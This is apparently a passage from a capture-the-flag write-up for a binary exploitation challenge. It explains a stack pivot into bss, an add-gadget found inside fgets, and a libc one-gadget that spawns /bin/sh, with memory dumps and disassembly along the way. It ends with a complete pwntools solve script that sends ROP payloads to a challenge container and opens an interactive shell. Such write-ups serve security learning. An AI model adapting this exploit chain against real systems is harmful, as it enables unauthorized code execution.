+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x000000404d70</span><span class="o">|+</span><span class="mh">0x0000</span><span class="o">|+</span><span class="mo">000</span><span class="o">:</span> <span class="mh">0x0000000012cf12c4</span> <span class="o">&lt;-</span> <span class="n">initial</span> <span class="n">value</span> <span class="n">of</span> <span class="n">rbp</span> <span class="n">before</span> <span class="n">we</span> <span class="n">leave</span> <span class="p">;</span> <span class="n">ret</span>
+<span class="mh">0x000000404d78</span><span class="o">|+</span><span class="mh">0x0008</span><span class="o">|+</span><span class="mo">001</span><span class="o">:</span> <span class="mh">0x0000000100000000</span>
+<span class="mh">0x000000404d80</span><span class="o">|+</span><span class="mh">0x0010</span><span class="o">|+</span><span class="mo">002</span><span class="o">:</span> <span class="mh">0x00007f7fc2f8b494</span> <span class="o">&lt;</span><span class="n">_IO_getline_info</span><span class="o">+</span><span class="mh">0x124</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0x448d4808244c8b48</span>
+<span class="mh">0x000000404d88</span><span class="o">|+</span><span class="mh">0x0018</span><span class="o">|+</span><span class="mo">003</span><span class="o">:</span> <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">RSP</span>
+<span class="mh">0x000000404d90</span><span class="o">|+</span><span class="mh">0x0020</span><span class="o">|+</span><span class="mo">004</span><span class="o">:</span> <span class="mh">0x0000000012cf12d6</span>
+<span class="mh">0x000000404d98</span><span class="o">|+</span><span class="mh">0x0028</span><span class="o">|+</span><span class="mo">005</span><span class="o">:</span> <span class="mh">0x00000001c3125aa0</span>
+<span class="mh">0x000000404da0</span><span class="o">|+</span><span class="mh">0x0030</span><span class="o">|+</span><span class="mo">006</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
+<span class="mh">0x000000404da8</span><span class="o">|+</span><span class="mh">0x0038</span><span class="o">|+</span><span class="mo">007</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
+<span class="mh">0x000000404db0</span><span class="o">|+</span><span class="mh">0x0040</span><span class="o">|+</span><span class="mo">00</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x0000000000000080</span>
+<span class="mh">0x000000404db8</span><span class="o">|+</span><span class="mh">0x0048</span><span class="o">|+</span><span class="mo">00</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x00007f7fc3125aa0</span> <span class="o">&lt;-</span> <span class="n">rbx</span>
+<span class="mh">0x000000404dc0</span><span class="o">|+</span><span class="mh">0x0050</span><span class="o">|+</span><span class="mo">010</span><span class="o">:</span> <span class="mh">0x000000000040498f</span> <span class="o">&lt;-</span> <span class="n">rbp</span>
+<span class="mh">0x000000404dc8</span><span class="o">|+</span><span class="mh">0x0058</span><span class="o">|+</span><span class="mo">011</span><span class="o">:</span> <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">r12</span>
+<span class="mh">0x000000404dd0</span><span class="o">|+</span><span class="mh">0x0060</span><span class="o">|+</span><span class="mo">012</span><span class="o">:</span> <span class="mh">0x0000000000403e18</span> <span class="o">&lt;-</span> <span class="n">r13</span>
+<span class="mh">0x000000404dd8</span><span class="o">|+</span><span class="mh">0x0068</span><span class="o">|+</span><span class="mo">013</span><span class="o">:</span> <span class="mh">0x00007f7fc317c040</span> <span class="o">&lt;-</span> <span class="n">r14</span>
+<span class="mh">0x000000404de0</span><span class="o">|+</span><span class="mh">0x0070</span><span class="o">|+</span><span class="mo">014</span><span class="o">:</span> <span class="mh">0x00007f7fc2f8a410</span> <span class="o">&lt;-</span> <span class="n">r15</span>
+<span class="mh">0x000000404de8</span><span class="o">|+</span><span class="mh">0x0078</span><span class="o">|+</span><span class="mo">015</span><span class="o">:</span> <span class="mh">0x0000000000000000</span> <span class="o">&lt;-</span> <span class="n">retaddr</span>
+<span class="mh">0x000000404df0</span><span class="o">|+</span><span class="mh">0x0080</span><span class="o">|+</span><span class="mo">016</span><span class="o">:</span> <span class="mh">0x0000000000404990</span>
+</code></pre></div></div>
+
+<p>this is just enough to do in one <code class="language-plaintext highlighter-rouge">0x80</code> write. we point <code class="language-plaintext highlighter-rouge">rbp</code> at anywhere after <code class="language-plaintext highlighter-rouge">0xd80</code> and set-up the values accordingly. also note that the ‘scratch’ space we get in the middle of our controlled registers and the <code class="language-plaintext highlighter-rouge">getline_info</code> gadget is actually really useful, because we need to dump our initial chain’s stored <code class="language-plaintext highlighter-rouge">rbp</code> and <code class="language-plaintext highlighter-rouge">retaddr</code> somewhere.*</p>
+
+<ul>
+  <li>(another brief aside - i actually was trying to use the add gadget twice, once to increment to one-gadget, another to point to a <code class="language-plaintext highlighter-rouge">libc</code> gadget that would allow me to modify <code class="language-plaintext highlighter-rouge">rdi</code> to null to meet one-gadget constraints, and the fact that the first <code class="language-plaintext highlighter-rouge">0x10</code> bytes of write <em>need</em> to be our <code class="language-plaintext highlighter-rouge">rbp</code> and <code class="language-plaintext highlighter-rouge">retaddr</code> completely botched this idea).</li>
+</ul>
+
+<h3 id="one-gadgets">one-gadgets</h3>
+
+<p>typing in <code class="language-plaintext highlighter-rouge">one</code> in <code class="language-plaintext highlighter-rouge">bata24</code>’s <code class="language-plaintext highlighter-rouge">gef</code> lets us see potential one-gadgets. i ended up using this one, because of our <code class="language-plaintext highlighter-rouge">r12</code> and <code class="language-plaintext highlighter-rouge">r13</code> control, and its loose constraints.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0xebce2</span> <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">r12</span><span class="p">)</span>
+<span class="n">constraints</span><span class="o">:</span>
+  <span class="n">address</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x48</span> <span class="n">is</span> <span class="n">writable</span>
+  <span class="n">r13</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">r13</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">}</span> <span class="n">is</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">argv</span>
+  <span class="p">[</span><span class="n">r12</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">r12</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">r12</span> <span class="n">is</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">envp</span>
+</code></pre></div></div>
+
+<p>just out of curiosity let’s actually look at the asm behind the one-gadget (because i fucking had to do this for about six hours after very foolishly trying other gadgets that didn’t work and i want to share this information somehow). i think a lot of us tend to treat one-gadgets as something you can anyhow dogshit whack but it is nice to gain an intuition for how these work under the hood:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">i</span> <span class="err">$</span><span class="n">libc</span><span class="o">+</span><span class="mh">0xebce2</span>
+   <span class="mh">0x7f7fc2ff6ce2</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">1234</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">r14</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xec98f</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x7f7fc30e3678</span> <span class="p">(</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">)</span>
+   <span class="mh">0x7f7fc2ff6ce9</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">1241</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x48</span><span class="p">],</span><span class="n">r13</span>
+   <span class="mh">0x7f7fc2ff6ced</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">1245</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">r8</span><span class="p">,[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x50</span><span class="p">]</span>
+   <span class="mh">0x7f7fc2ff6cf1</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">1249</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x50</span><span class="p">],</span><span class="n">r14</span>
+   <span class="mh">0x7f7fc2ff6cf5</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">1253</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x7f7fc2ff6a90</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">640</span><span class="o">&gt;</span>
+   <span class="p">[</span><span class="n">jmp</span><span class="p">]</span>
+   <span class="mh">0x7f7fc2ff6a90</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">640</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r8</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span><span class="mh">0x0</span>
+   <span class="mh">0x7f7fc2ff6a98</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">648</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span><span class="n">r12</span>
+   <span class="mh">0x7f7fc2ff6a9b</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">651</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">r8</span>
+   <span class="mh">0x7f7fc2ff6a9e</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">654</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">r14</span>
+   <span class="mh">0x7f7fc2ff6aa1</span> <span class="o">&lt;</span><span class="n">__execvpe</span><span class="o">+</span><span class="mi">657</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x7f7fc2ff6080</span> <span class="o">&lt;</span><span class="n">execve</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>typically, one_gadgets are just offsets to some existing libc function that already calls <code class="language-plaintext highlighter-rouge">execve</code> or <code class="language-plaintext highlighter-rouge">posix_spawn</code>, and by jumping into the middle of them with certain register values, we can manipulate the register setup that these functions perform to prepare the relevant calls. note here that <code class="language-plaintext highlighter-rouge">rdi</code> comes from <code class="language-plaintext highlighter-rouge">r14</code>, which the function already loads with a <code class="language-plaintext highlighter-rouge">/bin/sh</code> string for free, so we don’t need to put <code class="language-plaintext highlighter-rouge">/bin/sh</code> anywhere. further note that the reason we require <code class="language-plaintext highlighter-rouge">r13</code> to be null is because we are placing its value at <code class="language-plaintext highlighter-rouge">rbp - 0x48</code>, which eventually gets parsed as <code class="language-plaintext highlighter-rouge">execve</code>’s <code class="language-plaintext highlighter-rouge">argv</code>. similarly, <code class="language-plaintext highlighter-rouge">r12</code> must be null because it’s what eventually becomes the <code class="language-plaintext highlighter-rouge">env</code> value.</p>
+
+<p>to be honest i just think this is neat :)</p>
+
+<h3 id="actually-add-gadgeting">actually add-gadgeting</h3>
+
+<p>now we need a target to properly perform the <code class="language-plaintext highlighter-rouge">add</code> onto. surprisingly, there is one constraint that proves to be the most problematic, counter intuitively: it’s the constraint on <code class="language-plaintext highlighter-rouge">rbp</code>! recall that since the way we eventually call the <code class="language-plaintext highlighter-rouge">add</code> gadget is with a <code class="language-plaintext highlighter-rouge">leave ; ret</code>, the value directly <em>before</em> the gadget address gets popped into rbp.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x404d00</span><span class="o">:</span> <span class="mh">0x00</span>                  <span class="o">&lt;-</span> <span class="n">initial</span> <span class="n">value</span> <span class="n">of</span> <span class="n">rbp</span>
+<span class="mh">0x404d08</span><span class="o">:</span> <span class="mh">0xcafebabe</span>            <span class="o">&lt;-</span> <span class="n">new</span> <span class="n">value</span> <span class="n">of</span> <span class="n">rbp</span>
+<span class="mh">0x404d10</span><span class="o">:</span> <span class="mh">0x7f</span><span class="p">[</span><span class="n">one_gadget_addr</span><span class="p">]</span> 
+</code></pre></div></div>
+
+<p>what does this mean? it means that counterintuitively, we actually <em>don’t</em> have control of <code class="language-plaintext highlighter-rouge">rbp</code> before we hop into the one-gadget. either we can use another write to fill that space (which is kind of annoying), or we can just… spray more libc pointers and pray that one of them has a valid address we can use as an <code class="language-plaintext highlighter-rouge">rbp</code> value directly before. keep in mind we can choose to <code class="language-plaintext highlighter-rouge">add</code> to any libc pointer in bss, so… just spam more nonsense writes :)</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x000000404da8</span><span class="o">|+</span><span class="mh">0x00a8</span><span class="o">|+</span><span class="mo">021</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
+<span class="mh">0x000000404db0</span><span class="o">|+</span><span class="mh">0x00b0</span><span class="o">|+</span><span class="mo">022</span><span class="o">:</span> <span class="mh">0x0000000000000007</span>
+<span class="mh">0x000000404db8</span><span class="o">|+</span><span class="mh">0x00b8</span><span class="o">|+</span><span class="mo">023</span><span class="o">:</span> <span class="mh">0x0000000000404b00</span> <span class="o">&lt;-</span> <span class="n">valid</span> <span class="n">rbp</span> <span class="n">pointer</span> <span class="n">that</span> <span class="n">happened</span> <span class="n">to</span> <span class="n">exist</span><span class="p">,</span> <span class="n">by</span> <span class="n">the</span> <span class="n">grace</span> <span class="n">of</span> <span class="n">God</span>
+<span class="mh">0x000000404dc0</span><span class="o">|+</span><span class="mh">0x00c0</span><span class="o">|+</span><span class="mo">024</span><span class="o">:</span> <span class="mh">0x00007f7fc2ff6ce2</span> <span class="o">&lt;-</span> <span class="n">libc</span> <span class="n">pointer</span>
+</code></pre></div></div>
+
+<p>in my solve it just happened to be at <code class="language-plaintext highlighter-rouge">0x404dc0</code>, so after we perform the <code class="language-plaintext highlighter-rouge">add</code> gadgeting, we can just point <code class="language-plaintext highlighter-rouge">rbp</code> at <code class="language-plaintext highlighter-rouge">0x404db0</code>, call a <code class="language-plaintext highlighter-rouge">leave ; ret</code>, and win!</p>
+
+<p>here’s the full solvescript.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">WRITE</span>           <span class="o">=</span> <span class="mh">0x401142</span>
+<span class="n">LEAVE</span>           <span class="o">=</span> <span class="mh">0x40115a</span>
+<span class="n">ADD_GAD</span>         <span class="o">=</span> <span class="mh">0x40111c</span>
+<span class="n">POP_RBP</span>         <span class="o">=</span> <span class="mh">0x40111d</span>
+
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="n">l</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="mi">1</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'172.17.0.3'</span><span class="p">,</span> <span class="mi">5000</span><span class="p">)</span>
+<span class="nb">input</span><span class="p">(</span><span class="s">'[!]'</span><span class="p">)</span>
+
+<span class="c1">#p = process()
+# pivot RBP to BSS
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404e00</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+
+<span class="c1">#l()
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># move RSP to BSS
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404da0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">])</span>
+
+<span class="n">l</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1">#payload += b'\x00'
+#payload += p64(0x404a00)
+#payload += p64(WRITE)
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404990</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+
+<span class="n">l</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404500</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+<span class="n">l</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404da0</span><span class="p">)</span> <span class="c1"># next rbp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+
+<span class="n">l</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404d78</span><span class="p">)</span> <span class="c1"># rbp, leave will eventually cause us to RET to the getline_info gad
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LEAVE</span><span class="p">)</span> <span class="c1"># rsp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">twos</span><span class="p">(</span><span class="mh">0xebce2</span> <span class="o">-</span> <span class="mh">0x7f410</span><span class="p">))</span> <span class="c1"># rbx
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404de0</span> <span class="o">+</span> <span class="mh">0x3d</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404b00</span><span class="p">)</span> <span class="c1"># imagine
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RBP</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404508</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+
+<span class="n">l</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404308</span><span class="p">)</span> <span class="c1"># rbp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+
+<span class="n">l</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404e08</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">WRITE</span><span class="p">)</span>
+
+<span class="n">l</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404dc0</span> <span class="o">+</span> <span class="mh">0x3d</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADD_GAD</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RBP</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404dc0</span> <span class="o">-</span> <span class="mh">0x08</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LEAVE</span><span class="p">)</span>
+<span class="n">l</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="conclusion">conclusion</h3>
+
+<p>i’ve always enjoyed challenges like these because it feels like building something together with legos, but the legos are all falling apart and also collapse under their own weight half the time, like if you put a lego on a certain piece it’ll clobber some other brick 5 metres away and you’ll have to spend 3 years debugging how that lego piece fucked everything all up and also since all of it is built already you have to carefully select what to tear down and what to keep. it’s fun to see what works, fun to see what doesn’t.</p>
+
+<p>i also had a local solve at about 4pm and only managed to fix it at 520pm. the <code class="language-plaintext highlighter-rouge">fgets</code> shit is Very Finicky when you’re debugging and at some points, the contents of my spray were absolutely not what i wanted them to be, despite nothing changing except for a debugger being attached. i ended up doing what i usually do for these challenges, which is installing gef into the provided Dockerfile and just painstakingly debugging from within the container itself.</p>
+
+<p>additionally, what are the odds that we get such a useful gadget from <code class="language-plaintext highlighter-rouge">fgets</code> in the first place, huh??? initially there were some thoughts about partially overwriting the lsb of a libc ptr with a nullbyte and seeing if that pointed anywhere useful, but turns out it was completely fine and we didn’t even have to modify the gadget.</p>
+
+<p>of course, the reason we get this gadget in the first place is because it precedes a <code class="language-plaintext highlighter-rouge">call</code> instruction, which pushes its address onto the stack:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x7f7fc2f8b48f</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">287</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x7f7fc2f33620</span> <span class="o">&lt;*</span><span class="n">ABS</span><span class="o">*+</span><span class="mh">0xa9c10</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x7f7fc2f8b494</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">292</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
+   <span class="mh">0x7f7fc2f8b499</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">297</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rbp</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
+   <span class="mh">0x7f7fc2f8b49e</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">302</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r12</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="n">rcx</span>
+   <span class="mh">0x7f7fc2f8b4a3</span> <span class="o">&lt;</span><span class="n">__GI__IO_getline_info</span><span class="o">+</span><span class="mi">307</span><span class="o">&gt;:</span>	<span class="n">add</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x28</span>
+  <span class="p">...</span>
+</code></pre></div></div>
+
+<p>which just so happens to be before the function epilogue. neat!</p>
+
+<p>thanks to elma for the nice challenge. also if you want to see what the <code class="language-plaintext highlighter-rouge">ret2dlresolve</code> solution looks like, ancient pwn sensei lucas samuzAura tan <a href="https://samuzora.com/posts/grey-finals-2024#overly-simplified-pwn-challenge">has a great writeup on it</a>. despite my gripes against the technique i do think there is a lot of profundity to be thought about regarding what to resolve and how to use it.</p>
+
+
+</article>
+      </div>
+    </main>
+  </body>
+</html>
